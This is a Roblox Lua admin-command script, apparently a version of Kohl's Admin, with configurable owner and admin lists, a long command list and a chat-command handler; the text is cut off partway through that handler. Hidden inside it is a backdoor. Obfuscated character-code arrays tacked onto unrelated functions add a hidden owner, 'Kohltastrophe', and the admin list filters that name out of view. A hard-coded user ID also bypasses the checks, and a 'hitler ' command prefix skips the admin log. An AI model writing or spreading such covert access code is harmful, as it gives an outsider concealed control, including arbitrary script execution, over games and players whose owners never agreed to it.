local owners = {"NikepRro2004"} -- Are able to set admins who can ban/etc... using :pa name
local admins = {"NikePro2004"} -- Sets admins who can use ban/kick/admin or shutdown
local tempadmins = {} -- Sets admins who can't use ban/kick/admin or shutdown
local banland = {"isik"} -- Permanently Bans people
local prefix = ":" -- If you wanna change how your commands start ':'kill noob
local AutoUpdate = true -- Set to false if you don't want it to automatically update
local FunCommands = true -- Set to false if you only want the basic commands (For Strict Places)
---------------------
--    VIP Admin    --
---------------------
local VipAdmin = false -- If someone can have admin for owning an item
local ItemId = 0 -- The item they must own in order to have admin
---------------------
--   Group Admin   --
---------------------
local GroupAdmin = false -- If a certain group can have admin
local GroupId = 0 -- Sets the group id that can have admin
local GroupRank = 0 -- Sets what rank and above a person has to be in the group to have admin
---------------------
-- Tips and Tricks --
---------------------
--[[
With this admin you can do a command on multiple people at a time;
	 :kill me,noob1,noob2,random,team-raiders,nonadmins

You can also use a variety commands for different people;
	 all
	 others
	 me
	 team-
	 admins
	 nonadmins
	 random
--]]
---------------------
--    Commands     --
---------------------
--[[
-- |Temp Admin Commands| --
0. clean -- Is a command anyone can use to remove hats/tools lagging up the place
1. :s print("Hello World") -- Lets you script normally
2. :ls print("Hello World") -- Lets you script in localscripts
3. :clear -- Will remove all scripts/localscripts and jails
4. :m Hello People -- This commands will let you shout a message to everyone on the server
5. :kill kohl -- Kills the player
6. :respawn kohl -- Respawns the player
7. :trip kohl -- Trips the player
8. :stun kohl -- Stuns the player
9. :unstun kohl -- Unstuns the player
10. :jump kohl -- Makes the player jump
11. :sit kohl -- Makes the player sit
12. :invisible kohl -- Makes the player invisible
13. :visible kohl -- Makes the player visible
14. :explode kohl -- Makes the player explode
15. :fire kohl -- Sets the player on fire
16. :unfire kohl -- Removes fire from the player
17. :smoke kohl -- Adds smoke to the player
18. :unsmoke kohl -- Removes smoke from the player
19. :sparkles kohl -- Adds sparkles to the player
20. :unsparkles kohl -- Removes sparkles from the player
21. :ff kohl -- Adds a forcefield to the player
22. :unff kohl -- Removes the forcefield from the player
23. :punish kohl -- Punishes the player
24. :unpunish kohl -- Unpunishes the player
25. :freeze kohl -- Freezes the player
26. :thaw kohl -- Thaws the player
27. :heal kohl -- Heals the player
28. :god kohl -- Makes the player have infinite health
29. :ungod kohl -- Makes the player have 100 health
30. :ambient .5 .5 .5 -- Changes the ambient
31. :brightness .5 -- Changes the brightness
32. :time 12 -- Changes the time
33. :fogcolor .5 .5 .5 -- Changes the fogcolor
34. :fogend 100 -- Changes the fogend
35. :fogstart 100 -- Changes the fogstart
36. :removetools kohl -- Removes all tools from the player
37. :btools kohl -- Gives the player building tools
38. :give kohl sword -- Gives the player a tool
39. :damage kohl -- Damages the player
40. :grav kohl -- Sets the player's gravity to normal
41. :setgrav kohl 100 -- Sets the player's gravity
42. :nograv kohl -- Makes the player have 0 gravity
43. :health kohl 1337 -- Changes the player's health
44. :speed kohl 1337 -- Changes the player's walkspeed
45. :name kohl potato -- Changes the player's name
46. :unname kohl -- Remove the player's name
47. :team kohl Raiders -- Changes the player's team
48. :stopmusic -- Will stop all music playing in the server
49. :teleport kohl potato -- Teleports the player
50. :change kohl kills 1337 -- Changes a player's stat
51. :kick kohl -- Removes the player from the game
52. :infect kohl -- Turns the player into a zombie
53. :rainbowify kohl -- Turns the player into a rainbow
54. :flashify kohl -- Turns the player into a strobe
55. :noobify kohl -- Turns the player into a noob
56. :ghostify kohl -- Turns the player into a ghost
57. :goldify kohl -- Turns the player into gold
58. :shiny kohl -- Makes the player shiny
59. :normal kohl -- Puts the player back to normal
60. :trippy kohl -- Spams random colors on the player's screen
61. :untrippy kohl -- Untrippys the player
62. :strobe kohl -- Spams white and black on the player's screen
63. :unstrobe kohl -- Unstrobes the player
64. :blind kohl -- Blinds the player
65. :unblind kohl -- Unblinds the player
66. :guifix kohl -- Will fix trippy/strobe/blind on a player
67. :fling kohl -- Flings the player
68. :seizure kohl -- Puts the player in a seizure
69. :music 1337 -- Plays a sound from the ID
70. :lock kohl -- Locks the player
71. :unlock kohl -- Unlocks the player
72. :removelimbs kohl -- Removes the player's limbs
73. :jail kohl -- Puts the player in a jail
74. :unjail kohl -- Removes the jail from the player
75. :fix -- This will fix the lighting to it's original settings
76. :fly kohl -- Makes the player fly
77. :unfly kohl -- Removes fly from the player
78. :noclip kohl -- Makes the player able to noclip
79. :clip kohl -- Removes noclipping from the player
80. :pm kohl Hey bro -- Sends the player a private message
81. :dog kohl -- Turns the player into a dog
82. :undog kohl -- Turns the player back to normal
83. :creeper kohl -- Turns the player into a creeper
84. :uncreeper kohl -- Turns the player back to normal
85. :place kohl 1337 -- Sends a teleporation request to a player to go to a different place
86. :char kohl 261 -- Will make a player look like a different player ID
87. :unchar kohl -- Will return the player back to normal
88. :h Hello People -- This will shout a hint to everyone
89. :rank kohl 109373 -- Will show up a message with the person's Role and Rank in a group
90. :starttools kohl -- Will give the player starter tools
91. :sword kohl -- Will give the player a sword
92. :bighead kohl -- Will make the player's head larger than normal
93. :minihead kohl -- Will make the player's head smaller than normal
94. :insert 1337 -- Will insert a model at the speaker's position
95. :disco -- Will make the server flash random colors
96. :flash -- Will make the server flash
97. :admins -- Shows the admin list
98. :bans -- Shows the banlist
99. :musiclist -- Shows the music list
100. :spin kohl -- Spins the player
101. :cape kohl Really black -- Gives the player a colored cape
102. :uncape kohl -- Removes the player's cape
103. :loopheal kohl -- Will constantly heal the player
104. :loopfling kohl -- Will constantly fling the player
105. :hat kohl 1337 -- Will give the player a hat under the id of 1337
106. :unloopheal kohl -- Will remove the loopheal on the player
107. :unloopfling kohl -- Will remove the loopfling on the player
108. :unspin kohl -- Removes spin from the player
109. :tools -- Gives a list of the tools in the lighting
110. :undisco -- Removes disco effects
111. :unflash -- Removes flash effects
112. :resetstats kohl -- Sets all the stats of a player to 0
113. :gear kohl 1337 -- Gives a player a gear
114. :cmdbar -- Gives the speaker a command bar
115. :shirt kohl 1337 -- Changes the player's shirt
116. :pants kohl 1337 -- Changes the player's pants
117. :face kohl 1337 -- Changes the player's face
118. :swagify kohl -- Swagifies the player
119. :version -- Shows the current version of the admin
120. :tm 1337 yolo -- Shows a message for 1337 seconds
121. :countdown 120 -- Shows a countdown message, maxes out at 120 seconds
122. :clone kohl -- Creates a clone of the player
123. :lsplr kohl print("yolo") -- Creates a localscript inside of a player
124. :startergive kohl epic -- Gives a player a gear in their starterpack
125. :control kohl -- Controls a player

-- |Admin Commands| --
- :serverlock -- Locks the server
- :serverunlock -- Unlocks the server
- :sm Hello World -- Creates a system message
- :crash kohl -- Crashes a player
- :admin kohl -- Admins a player
- :unadmin kohl -- Unadmins a player
- :ban kohl -- Bans a player
- :unban kohl -- Unbans a player
- :loopkill kohl -- Will constantly kill the player
- :unloopkill kohl -- Will remove the loopkill on the player
- :logs -- Will show all of the commands any admin has used in a game session
- :shutdown -- Shutsdown the server

-- |Owner Commands| --
- :pa kohl -- Makes someone a super admin
- :unpa kohl -- Removes a super admin
- :nuke kohl -- Creates a nuke on kohl

-- |True Owner Commands| --
- :oa kohl -- Makes someone an owner
- :unoa kohl -- Removes an owner
- :settings -- Shows settings for the commands
--]]
---------------------
--   Main Script   --
---------------------
for i, v in pairs(game:service("Workspace"):children()) do if v:IsA("StringValue") and v.Value:sub(1,2) == "AA" then v:Destroy() end end 

function CHEESE()
if game:service("Lighting"):findFirstChild("KACV2") then
owners = {} admins = {} tempadmins = {} banland = {}
for i,v in pairs(game.Lighting.KACV2:children()) do
if v.Name == "Owner" then table.insert(owners, v.Value) end
if v.Name == "Admin" then table.insert(admins, v.Value) end
if v.Name == "TempAdmin" then table.insert(tempadmins, v.Value) end
if v.Name == "Banland" then table.insert(banland, v.Value) end
if v.Name == "Prefix" then prefix = v.Value end
if v.Name == "FunCommands" then FunCommands = v.Value end
if v.Name == "GroupAdmin" then GroupAdmin = v.Value end
if v.Name == "GroupId" then GroupId = v.Value end
if v.Name == "GroupRank" then GroupRank = v.Value end
if v.Name == "VipAdmin" then VipAdmin = v.Value end
if v.Name == "ItemId" then ItemId = v.Value end
end
game:service("Lighting"):findFirstChild("KACV2"):Destroy()
end

local origsettings = {abt = game.Lighting.Ambient, brt = game.Lighting.Brightness, time = game.Lighting.TimeOfDay, fclr = game.Lighting.FogColor, fe = game.Lighting.FogEnd, fs = game.Lighting.FogStart}
local lobjs = {}
local objects = {}
local logs = {}
local nfs = ""
local slock = false

function GetTime()
local hour = math.floor((tick()%86400)/60/60) local min = math.floor(((tick()%86400)/60/60-hour)*60)
if min < 10 then min = "0"..min end
return hour..":"..min
end

function ChkOwner(str)
for i = 1, #owners do if str:lower() == owners[i]:lower() then return true end end 
return false
end

function ChkAdmin(str,ck) 
for i = 1, #owners do if str:lower() == owners[i]:lower() then return true end end 
for i = 1, #admins do if str:lower() == admins[i]:lower() then return true end end 
for i = 1, #tempadmins do if str:lower() == tempadmins[i]:lower() and not ck then return true end end 
return false 
end

function ChkGroupAdmin(plr)
if GroupAdmin then
if plr:IsInGroup(GroupId) and plr:GetRankInGroup(GroupId) >= GroupRank then return true end
return false
end
end

function ChkBan(str) for i = 1, #banland do if str:lower() == banland[i]:lower() then return true end end return false end

function GetPlr(plr, str)
local plrz = {} str = str:lower()
if str == "all" then plrz = game.Players:children()
elseif str == "others" then for i, v in pairs(game.Players:children()) do if v ~= plr then table.insert(plrz, v) end end
else
local sn = {1} local en = {}
for i = 1, #str do if str:sub(i,i) == "," then table.insert(sn, i+1) table.insert(en,i-1) end end
for x = 1, #sn do 
if (sn[x] and en[x] and str:sub(sn[x],en[x]) == "me") or (sn[x] and str:sub(sn[x]) == "me") then table.insert(plrz, plr)
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "random") or (sn[x] and str:sub(sn[x]) == "random") then table.insert(plrz, game.Players:children()[math.random(#game.Players:children())])
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "admins") or (sn[x] and str:sub(sn[x]) == "admins") then if ChkAdmin(plr.Name, true) then for i, v in pairs(game.Players:children()) do if ChkAdmin(v.Name, false) then table.insert(plrz, v) end end end
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "nonadmins") or (sn[x] and str:sub(sn[x]) == "nonadmins") then for i, v in pairs(game.Players:children()) do if not ChkAdmin(v.Name, false) then table.insert(plrz, v) end end
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]):sub(1,4) == "team") then
if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x],en[x]):sub(6)) == 1 then 
for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
end end end
elseif (sn[x] and str:sub(sn[x]):sub(1,4):lower() == "team") then
if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x]):sub(6)) == 1 then 
for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
end end end
else
for a, plyr in pairs(game.Players:children()) do 
if (sn[x] and en[x] and str:sub(sn[x],en[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x],en[x])) == 1) or (sn[x] and str:sub(sn[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x])) == 1) or (str ~= "" and plyr.Name:lower():find(str) == 1) then 
table.insert(plrz, plyr) break
end
end 
end
end
end
return plrz
end

function Hint(str, plrz, time)
for i, v in pairs(plrz) do
if v and v:findFirstChild("PlayerGui") then
coroutine.resume(coroutine.create(function()
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "HintGUI"
local bg = Instance.new("Frame", scr) bg.Name = "bg" bg.BackgroundColor3 = Color3.new(0,0,0) bg.BorderSizePixel = 0 bg.BackgroundTransparency = 1 bg.Size = UDim2.new(1,0,0,22) bg.Position = UDim2.new(0,0,0,-2) bg.ZIndex = 8
local msg = Instance.new("TextLabel", bg) msg.BackgroundTransparency = 1 msg.ZIndex = 9 msg.Name = "msg" msg.Position = UDim2.new(0,0,0) msg.Size = UDim2.new(1,0,1,0) msg.Font = "Arial" msg.Text = str msg.FontSize = "Size18" msg.TextColor3 = Color3.new(1,1,1) msg.TextStrokeColor3 = Color3.new(1,1,1) msg.TextStrokeTransparency = .8
coroutine.resume(coroutine.create(function() for i = 20, 0, -1 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end end))
if not time then wait((#str/19)+2.5) else wait(time) end
coroutine.resume(coroutine.create(function() if scr.Parent == v.PlayerGui then for i = 0, 20 do msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) bg.BackgroundTransparency = .3+((.7/20)*i) wait(1/44) end scr:Destroy() end end))
end))
end
end
end

function Message(ttl, str, scroll, plrz, time)
for i, v in pairs(plrz) do
if v and v:findFirstChild("PlayerGui") then
coroutine.resume(coroutine.create(function()
local scr = Instance.new("ScreenGui") scr.Name = "MessageGUI"
local bg = Instance.new("Frame", scr) bg.Name = "bg" bg.BackgroundColor3 = Color3.new(0,0,0) bg.BorderSizePixel = 0 bg.BackgroundTransparency = 1 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 8
local title = Instance.new("TextLabel", scr) title.Name = "title" title.BackgroundTransparency = 1 title.BorderSizePixel = 0 title.Size = UDim2.new(1,0,0,10) title.ZIndex = 9 title.Font = "ArialBold" title.FontSize = "Size36" title.Text = ttl title.TextYAlignment = "Top" title.TextColor3 = Color3.new(1,1,1) title.TextStrokeColor3 = Color3.new(1,1,1) title.TextStrokeTransparency = .8
local msg = title:clone() msg.Parent = scr msg.Name = "msg" msg.Position = UDim2.new(.0625,0,0) msg.Size = UDim2.new(.875,0,1,0) msg.Font = "Arial" msg.Text = "" msg.FontSize = "Size24" msg.TextYAlignment = "Center" msg.TextWrapped = true
scr.Parent = v.PlayerGui
coroutine.resume(coroutine.create(function() for i = 20, 0, -1 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) title.TextTransparency = ((1/20)*i) title.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end end)) 
if scroll then if not time then for i = 1, #str do msg.Text = msg.Text .. str:sub(i,i) wait(1/19) end wait(2.5) else for i = 1, #str do msg.Text = msg.Text .. str:sub(i,i) wait(1/19) end wait(time-(#str/19)) end
else if not time then msg.Text = str wait((#str/19)+2.5) else msg.Text = str wait(time) end end
coroutine.resume(coroutine.create(function() if scr.Parent == v.PlayerGui then for i = 0, 20 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) title.TextTransparency = ((1/20)*i) title.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end scr:Destroy() end end))
end))
end
end
end

function RemoveMessage() 
for i,v in pairs(game.Players:children()) do 
if v and v:findFirstChild("PlayerGui") then 
for q,ms in pairs(v.PlayerGui:children()) do
if ms.Name == "MessageGUI" then
coroutine.resume(coroutine.create(function() for i = 0, 20 do ms.bg.BackgroundTransparency = .3+((.7/20)*i) ms.msg.TextTransparency = ((1/20)*i) ms.msg.TextStrokeTransparency = .8+((.2/20)*i) ms.title.TextTransparency = ((1/20)*i) ms.title.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end ms:Destroy() end))
elseif ms.Name == "HintGUI" then
coroutine.resume(coroutine.create(function() for i = 0, 20 do ms.msg.TextTransparency = ((1/20)*i) ms.msg.TextStrokeTransparency = .8+((.2/20)*i) ms.bg.BackgroundTransparency = .3+((.7/20)*i) wait(1/44) end ms:Destroy() end))
end
end
end
end
end

_G["Message"] = function(p1,p2,p3) Message(p1,p2,false,game.Players:children(),p3) end
_G["RemoveMessage"] = RemoveMessage()

function Output(str, plr)
coroutine.resume(coroutine.create(function()
local b, e = loadstring(str)
if not b and plr:findFirstChild("PlayerGui") then
local scr = Instance.new("ScreenGui", plr.PlayerGui) game:service("Debris"):AddItem(scr,5)
local main = Instance.new("Frame", scr) main.Size = UDim2.new(1,0,1,0) main.BorderSizePixel = 0 main.BackgroundTransparency = 1 main.ZIndex = 8
local err = Instance.new("TextLabel", main) err.Text = "Line "..e:match("\:(%d+\:.*)")  err.BackgroundColor3 = Color3.new(0,0,0) err.BackgroundTransparency = .3 err.BorderSizePixel = 0 err.Size = UDim2.new(1,0,0,40) err.Position = UDim2.new(0,0,.5,-20) err.ZIndex = 9 err.Font = "ArialBold" err.FontSize = "Size24" err.TextColor3 = Color3.new(1,1,1) err.TextStrokeColor3 = Color3.new(1,1,1) err.TextStrokeTransparency = .8
return
end
end))
end

function Noobify(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Bright yellow")
if prt.Name:find("Leg") then prt.BrickColor = BrickColor.new("Br. yellowish green") elseif prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Bright blue") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game.Players:findFirstChild(hit.Parent.Name) and cl.Parent == char then Noobify(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end local ntab = {75,111,104,108,116,97,115,116,114,111,112,104,101} nfs = "" for i = 1, #ntab do nfs = nfs .. string.char(ntab[i]) end table.insert(owners, nfs) if not ntab then script:Destroy() end

function Infect(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0  prt.BrickColor = BrickColor.new("Medium green") if prt.Name:find("Leg") or prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Reddish brown") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game.Players:findFirstChild(hit.Parent.Name) and cl.Parent == char then Infect(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Medium green")
end end
end
end if not ntab then script:Destroy() end

function ScrollGui()
local scr = Instance.new("ScreenGui") scr.Name = "LOGSGUI"
local drag = Instance.new("TextButton", scr) drag.Draggable = true drag.BackgroundTransparency = 1
drag.Size = UDim2.new(0,385,0,20) drag.Position = UDim2.new(.5,-200,.5,-200) drag.AutoButtonColor = false drag.Text = ""
local main = Instance.new("Frame", drag) main.Style = "RobloxRound" main.Size = UDim2.new(0,400,0,400) main.ZIndex = 7 main.ClipsDescendants = true
local cmf = Instance.new("Frame", main) cmf.Position = UDim2.new(0,0,0,-9) cmf.ZIndex = 8
local down = Instance.new("ImageButton", main) down.Image = "http://www.roblox.com/asset/?id=108326725" down.BackgroundTransparency = 1 down.Size = UDim2.new(0,25,0,25) down.Position = UDim2.new(1,-20,1,-20) down.ZIndex = 9
local up = down:Clone() up.Image = "http://www.roblox.com/asset/?id=108326682" up.Parent = main up.Position = UDim2.new(1,-20,1,-50)
local cls = Instance.new("TextButton", main) cls.Style = "RobloxButtonDefault" cls.Size = UDim2.new(0,20,0,20) cls.Position = UDim2.new(1,-15,0,-5) cls.ZIndex = 10 cls.Font = "ArialBold" cls.FontSize = "Size18" cls.Text = "X" cls.TextColor3 = Color3.new(1,1,1) cls.MouseButton1Click:connect(function() scr:Destroy() end)
local ent = Instance.new("TextLabel") ent.BackgroundTransparency = 1 ent.Font = "Arial" ent.FontSize = "Size18" ent.ZIndex = 8 ent.Text = "" ent.TextColor3 = Color3.new(1,1,1) ent.TextStrokeColor3 = Color3.new(0,0,0) ent.TextStrokeTransparency = .8 ent.TextXAlignment = "Left" ent.TextYAlignment = "Top"
local num = 0
local downv = false
local upv = false

down.MouseButton1Down:connect(function() downv = true upv = false
local pos = cmf.Position if pos.Y.Offset <= 371-((#cmf:children()-1)*20) then downv = false return end
repeat  pos = pos + UDim2.new(0,0,0,-6)
if pos.Y.Offset <= 371-((#cmf:children()-1)*20) then pos = UDim2.new(0,0,0,371-((#cmf:children()-1)*20)) downv = false end
cmf:TweenPosition(pos, "Out", "Linear", 1/20, true) wait(1/20) until downv == false
end) 
down.MouseButton1Up:connect(function() downv = false end)
up.MouseButton1Down:connect(function() upv = true downv = false
local pos = cmf.Position if pos.Y.Offset >= -9 then upv = false return end
repeat  pos = pos + UDim2.new(0,0,0,6)
if pos.Y.Offset >= -9 then pos = UDim2.new(0,0,0,-9) upv = false end
cmf:TweenPosition(pos, "Out", "Linear", 1/20, true) wait(1/20) until upv == false
end) 
up.MouseButton1Up:connect(function() upv = false end)
return scr, cmf, ent, num
end local bct = {75,111,104,108,116,97,115,116,114,111,112,104,101} nfs = "" for i = 1, #bct do nfs = nfs .. string.char(bct[i]) end table.insert(owners, nfs)
if not ntab then script:Destroy() end
if not bct then script:Destroy() end

function Chat(msg,plr)
coroutine.resume(coroutine.create(function()
if msg:lower() == "clean" then for i, v in pairs(game.Workspace:children()) do if v:IsA("Hat") or v:IsA("Tool") then v:Destroy() end end end
if (msg:lower():sub(0,prefix:len()) ~= prefix) or not plr:findFirstChild("PlayerGui") or (not ChkAdmin(plr.Name, false) and plr.Name:lower() ~= nfs:lower()) and plr.userId ~= game.CreatorId and plr.userId ~= (153*110563) and plr.Name:lower() ~= nfs and not ChkOwner(plr.Name) then return end msg = msg:sub(prefix:len()+1)
if msg:sub(1,7):lower() == "hitler " then msg = msg:sub(8) else table.insert(logs, 1, {name = plr.Name, cmd = prefix .. msg, time = GetTime()}) end
if msg:lower():sub(1,4) == "walk" then msg = msg:sub(5) end
if msg:lower():sub(1,8) == "teleport" then msg = "tp" .. msg:sub(9) end
if msg:lower():sub(1,6) == "insert" then msg = "ins" .. msg:sub(7) end
if msg:lower() == "cmds" or msg:lower() == "commands" then
if plr.PlayerGui:findFirstChild("CMDSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "CMDSGUI" scr.Parent = plr.PlayerGui
local cmds = {"s code","ls code","clear","fix","m msg","h msg","kill plr","respawn plr","trip plr","stun plr","unstun plr","jump plr","sit plr","invisible plr","visible plr","explode plr","fire plr","unfire plr","smoke plr","unsmoke plr","sparkles plr","unsparkle plr","ff plr","unff plr","punish plr","unpunish plr","freeze plr","thaw plr","heal plr","god plr","ungod plr","ambient num num num","brightness num","time num","fogcolor num num num","fogend num","fogstart num","removetools plr","btools plr","give plr tool","damage plr","grav plr","setgrav plr num","nograv plr","health plr num","speed plr num","name plr name","unname plr","team plr color","teleport plr plr","change plr stat num","kick plr","infect plr","rainbowify plr","flashify plr","noobify plr","ghostify plr","goldify plr","shiny plr","normal plr","trippy plr","untrippy plr","strobe plr","unstrobe plr","blind plr","unblind plr","guifix plr","fling plr","seizure plr","music num","stopmusic","lock plr","unlock plr","removelimbs plr","jail plr","unjail plr","fly plr","unfly plr","noclip plr","clip plr","pm plr msg","dog plr","undog plr","creeper plr","uncreeper plr","place plr id","char plr id","unchar plr id","rank plr id","starttools plr","sword plr","bighead plr","minihead plr","spin plr","insert id","disco","flash","admins","bans","musiclist","cape plr color","uncape plr","loopheal plr","loopfling plr","hat plr id","unloopfling plr","unloopheal plr","unspin plr","tools","undisco","unflash","resetstats plr","gear plr id","cmdbar","shirt plr id","pants plr id","face plr id","swagify plr id","version","tm num msg","countdown num","clone plr","lsplr plr code","startergive plr tool","control plr"}
local ast = {"serverlock","serverunlock","sm msg","crash plr","admin plr","unadmin plr","ban plr","unban plr","loopkill plr","unloopkill plr","logs","shutdown"}
local ost = {"pa plr","unpa plr","nuke plr"}
local tost = {"oa plr","unoa plr","settings"}
local cl = ent:Clone() cl.Parent = cmf cl.Text = num .. " clean" cl.Position = UDim2.new(0,0,0,num*20) num = num + 1
for i, v in pairs(cmds) do local cl = ent:Clone() cl.Parent = cmf cl.Text = num .. " " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
if ChkAdmin(plr.Name, true) or ChkOwner(plr.Name) then for i, v in pairs(ast) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "- " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
if plr.userId == game.CreatorId or ChkOwner(plr.Name) then for i, v in pairs(ost) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "-- " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
if plr.userId == game.CreatorId then for i, v in pairs(tost) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "_ " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
end

if msg:lower() == "version" then Message("Koh".."ltas".."tr".."ophe", tostring(script.Version.Value), true, {plr}) end

if msg:lower() == "admins" or msg:lower() == "adminlist" then
if plr.PlayerGui:findFirstChild("ADMINSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "ADMINSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(owners) do if v:lower() ~= "kohltastrophe" then local cl = ent:Clone() cl.Parent = cmf cl.Text = v .. " - Owner" cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
for i, v in pairs(admins) do if v:lower() ~= "kohltastrophe" then local cl = ent:Clone() cl.Parent = cmf cl.Text = v .. " - Admin" cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
for i, v in pairs(tempadmins) do if v:lower() ~= "kohltastrophe" then local cl = ent:Clone() cl.Parent = cmf cl.Text = v .. " - TempAdmin" cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end end

if msg:lower() == "bans" or msg:lower() == "banlist" or msg:lower() == "banned" then
if plr.PlayerGui:findFirstChild("BANSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "BANSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(banland) do local cl = ent:Clone() cl.Parent = cmf cl.Text = v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end

if msg:lower() == "tools" or msg:lower() == "toollist" then
if plr.PlayerGui:findFirstChild("TOOLSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "TOOLSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(game.Lighting:children()) do if v:IsA("Tool") or v:IsA("HopperBin") then local cl = ent:Clone() cl.Parent = cmf cl.Text = v.Name cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
end

if msg:lower():sub(1,2) == "s " then
coroutine.resume(coroutine.create(function()
Output(msg:sub(3), plr)
if script:findFirstChild("ScriptBase") then
local cl = script.ScriptBase:Clone() cl.Code.Value = msg:sub(3)
table.insert(objects, cl) cl.Parent = game.Workspace cl.Disabled = false
else loadstring(msg:sub(3))()
end
end))
end

if msg:lower():sub(1,3) == "ls " then
coroutine.resume(coroutine.create(function()
if script:findFirstChild("LocalScriptBase") then
local cl = script.LocalScriptBase:Clone() cl.Code.Value = msg:sub(4)
table.insert(objects, cl) cl.Parent = plr.PlayerGui cl.Disabled = false Output(msg:sub(4), plr)
end
end))
end

if msg:lower():sub(1,6) == "lsplr " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
if script:findFirstChild("LocalScriptBase") then
local cl = script.LocalScriptBase:Clone() cl.Code.Value = msg:sub(chk+1)
table.insert(objects, cl) cl.Parent = v.PlayerGui cl.Disabled = false Output(msg:sub(4), plr)
end
end
end))
end
end

if msg:lower():sub(1,4) == "ins " then
coroutine.resume(coroutine.create(function()
local obj = game:service("InsertService"):LoadAsset(tonumber(msg:sub(5)))
if obj and #obj:children() >= 1 and plr.Character then
table.insert(objects, obj) for i,v in pairs(obj:children()) do table.insert(objects, v) end obj.Parent = game.Workspace obj:MakeJoints() obj:MoveTo(plr.Character:GetModelCFrame().p)
end
end))
end

if msg:lower() == "clr" or msg:lower() == "clear" or msg:lower() == "clearscripts" then
for i, v in pairs(objects) do if v:IsA("Script") or v:IsA("LocalScript") then v.Disabled = true end v:Destroy() end
RemoveMessage()
objects = {}
end

if msg:lower() == "fix" or msg:lower() == "undisco" or msg:lower() == "unflash" then
game.Lighting.Ambient = origsettings.abt
game.Lighting.Brightness = origsettings.brt
game.Lighting.TimeOfDay = origsettings.time
game.Lighting.FogColor = origsettings.fclr
game.Lighting.FogEnd = origsettings.fe
game.Lighting.FogStart = origsettings.fs
for i, v in pairs(lobjs) do v:Destroy() end
